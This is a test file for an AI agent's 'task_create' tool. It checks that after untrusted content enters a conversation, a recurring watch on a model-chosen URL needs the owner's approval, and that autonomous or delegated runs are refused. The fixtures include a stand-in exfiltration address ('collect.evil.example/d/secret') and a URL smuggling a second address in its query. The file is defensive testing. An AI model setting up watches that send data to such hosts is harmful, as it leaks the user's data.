import { describe, it, expect, vi } from 'vitest';
import type { ToolEntry, PromptMeta, PromptText } from '../../types/index.js';

/**
 * A watch `task_create` sets up once foreign content is in the conversation: the page it will read
 * goes through the same origin check as an `http_request` GET. The model chose that address, and
 * the worker reads it later, unattended and again and again. The declarations under test are the
 * tool's own (`taskCreateTool`); only its handler is replaced, so no task is stored.
 */

vi.mock('@anthropic-ai/sdk', () => {
  class MockAnthropic { beta = { messages: { stream: vi.fn() } }; }
  class APIError extends Error {}
  return { default: MockAnthropic, APIError };
});
vi.mock('../../core/stream.js', () => ({ StreamProcessor: vi.fn() }));

import { Agent } from '../../core/agent.js';
import { OwnerKnownTargets } from '../../core/owner-known-targets.js';
import { ConversationLatch } from '../../core/conversation-latch.js';
import { flattenPrompt } from '../../core/prompt-value.js';
import { taskCreateTool } from './task.js';

type Result = { content: unknown; is_error?: boolean };
type Exec = { _executeOneInner(tc: unknown): Promise<Result> };
type Input = { title: string; watch_url?: string; watch_interval_minutes?: number; schedule?: string; workflow_id?: string };

function taskCreate(): ToolEntry & { created: string[] } {
  const created: string[] = [];
  return {
    ...(taskCreateTool as unknown as ToolEntry),
    created,
    handler: async (input: Input) => { created.push(input.watch_url ?? input.title); return 'ok'; },
  } as unknown as ToolEntry & { created: string[] };
}

function asker(answer: string): { fn: (q: string | PromptText, o?: string[], m?: PromptMeta) => Promise<string>; asked: string[] } {
  const asked: string[] = [];
  return { asked, fn: async (q) => { asked.push(flattenPrompt(q)); return answer; } };
}

type Extra = Partial<ConstructorParameters<typeof Agent>[0]>;

function agentOf(tool: ToolEntry, promptUser: ((q: string | PromptText) => Promise<string>) | undefined, ownerText = 'nothing named', tainted = true, extra: Extra = {}): Agent {
  const agent = new Agent({
    name: 'a', model: 'claude-sonnet-4-6', provider: 'anthropic', noticeLanguage: 'en',
    tools: [tool], promptUser,
    ownerKnown: OwnerKnownTargets.of({ ownerTexts: () => [ownerText] }),
    conversationLatch: ConversationLatch.detached(),
    ...extra,
  } as ConstructorParameters<typeof Agent>[0]);
  if (tainted) agent.restoreConversationTaint();
  return agent;
}

const call = (agent: Agent, input: Input): Promise<Result> =>
  (agent as unknown as Exec)._executeOneInner({ type: 'tool_use', id: `w${Math.random()}`, name: 'task_create', input });

const EVIL = 'https://collect.evil.example/d/secret';

describe('a watch task_create sets up after foreign content', () => {
  it('a watch_url with data in the path is asked about, and no watch is created without a yes', async () => {
    const tool = taskCreate();
    const ask = asker('Deny');
    const agent = agentOf(tool, ask.fn);
    const result = await call(agent, { title: 'Watch', watch_url: EVIL });
    expect(ask.asked).toHaveLength(1);
    expect(tool.created).toEqual([]);
    expect(String(result.content)).toMatch(/^Not read: /);
  });

  it('the question says the page is read again and again, and that the yes holds for every check', async () => {
    const tool = taskCreate();
    const ask = asker('Deny');
    const agent = agentOf(tool, ask.fn);
    await call(agent, { title: 'Watch', watch_url: EVIL });
    expect(ask.asked[0]).toMatch(/^Watch the page on "collect\.evil\.example"\? lynox then checks it every 60 minutes on its own, until the watch is deleted\. /);
    expect(ask.asked[0]).toContain('"collect.evil.example" gets, on every check, the whole address');
    expect(ask.asked[0]).toContain('A yes creates this watch, and its checks do not ask again.');
    expect(ask.asked[0]).not.toContain('this one read only');
  });

  it('the interval in the question is the one the handler uses: at least 5 minutes', async () => {
    const ask = asker('Deny');
    await call(agentOf(taskCreate(), ask.fn), { title: 'Watch', watch_url: EVIL, watch_interval_minutes: 2 });
    await call(agentOf(taskCreate(), ask.fn), { title: 'Watch', watch_url: EVIL, watch_interval_minutes: 15 });
    expect(ask.asked[0]).toContain('every 5 minutes');
    expect(ask.asked[1]).toContain('every 15 minutes');
  });

  it('in German it asks to watch the page, not to read it once', async () => {
    const tool = taskCreate();
    const ask = asker('Deny');
    const agent = agentOf(tool, ask.fn, 'nothing named', true, { noticeLanguage: 'de' } as Extra);
    await call(agent, { title: 'Watch', watch_url: EVIL });
    expect(ask.asked[0]).toMatch(/^Seite auf „collect\.evil\.example“ beobachten\? lynox prüft sie dann alle 60 Minuten selbst, bis die Beobachtung gelöscht ist\. /);
    expect(ask.asked[0]).toContain('erhält bei jeder Prüfung die ganze Adresse');
    expect(ask.asked[0]).toContain('Ein Ja legt diese Beobachtung an, und ihre Prüfungen fragen nicht noch einmal.');
  });

  it('a yes creates the watch', async () => {
    const tool = taskCreate();
    const ask = asker('Allow');
    const agent = agentOf(tool, ask.fn);
    await call(agent, { title: 'Watch', watch_url: EVIL });
    expect(ask.asked).toHaveLength(1);
    expect(tool.created).toEqual([EVIL]);
  });

  it('CONTROL: a watch on a host the owner named is created without a question', async () => {
    const tool = taskCreate();
    const ask = asker('Deny');
    const agent = agentOf(tool, ask.fn, 'watch the prices on shop.example.ch');
    await call(agent, { title: 'Watch', watch_url: 'https://shop.example.ch/prices' });
    expect(ask.asked).toEqual([]);
    expect(tool.created).toEqual(['https://shop.example.ch/prices']);
  });

  it('CONTROL: without foreign content before it, the same watch is not asked about', async () => {
    const tool = taskCreate();
    const ask = asker('Deny');
    const agent = agentOf(tool, ask.fn, 'nothing named', false);
    await call(agent, { title: 'Watch', watch_url: EVIL });
    expect(ask.asked).toEqual([]);
    expect(tool.created).toEqual([EVIL]);
  });

  it('CONTROL: a call the handler does not turn into a watch is not asked about (a schedule or a workflow comes first)', async () => {
    const tool = taskCreate();
    const ask = asker('Deny');
    const agent = agentOf(tool, ask.fn);
    await call(agent, { title: 'Daily', schedule: '0 8 * * *', watch_url: EVIL });
    await call(agent, { title: 'Flow', workflow_id: 'wf-1', watch_url: EVIL });
    await call(agent, { title: 'Plain task' });
    expect(ask.asked).toEqual([]);
    expect(tool.created).toEqual([EVIL, EVIL, 'Plain task']);
  });

  it('a session of someone the owner let in is refused, not asked', async () => {
    const tool = taskCreate();
    const ask = asker('Allow');
    const agent = agentOf(tool, ask.fn, 'nothing named', true, { principal: { kind: 'mandate', email: 'helper@example.ch' } } as Extra);
    const result = await call(agent, { title: 'Watch', watch_url: EVIL });
    expect(ask.asked).toEqual([]);
    expect(tool.created).toEqual([]);
    expect(result.is_error).toBe(true);
  });

  it('a run nobody can be asked in (a trigger) is refused, and no watch is created', async () => {
    const tool = taskCreate();
    const agent = agentOf(tool, undefined, 'nothing named', false, { autonomy: 'autonomous', sendOrigin: { kind: 'trigger', name: 'Preise' } } as Extra);
    agent.noteUntrustedData();
    const result = await call(agent, { title: 'Watch', watch_url: EVIL });
    expect(tool.created).toEqual([]);
    expect(String(result.content)).toMatch(/^Not read: /);
    expect(String(result.content)).toContain('the owner did not name "collect.evil.example"');
  });

  it('a page a search listed is watched without a question', async () => {
    const tool = taskCreate();
    const ask = asker('Deny');
    const agent = agentOf(tool, ask.fn);
    agent.searchResultAddresses.noteResults('price list', ['https://news.listed.example/prices']);
    await call(agent, { title: 'Watch', watch_url: 'https://news.listed.example/prices' });
    expect(ask.asked).toEqual([]);
    expect(tool.created).toEqual(['https://news.listed.example/prices']);
  });

  it('an address that carries another address is asked about as a watch, even on a host the owner named', async () => {
    const tool = taskCreate();
    const ask = asker('Deny');
    const agent = agentOf(tool, ask.fn, 'watch shop.example.ch');
    await call(agent, { title: 'Watch', watch_url: 'https://shop.example.ch/fetch?u=https%3A%2F%2Fcollect.evil.example%2Fd' });
    expect(ask.asked).toHaveLength(1);
    expect(ask.asked[0]).toMatch(/^Watch the page on "shop\.example\.ch"\? /);
    expect(ask.asked[0]).toContain('carries another address');
    expect(ask.asked[0]).toContain('A yes creates this watch, and its checks do not ask again.');
    expect(tool.created).toEqual([]);
  });
});
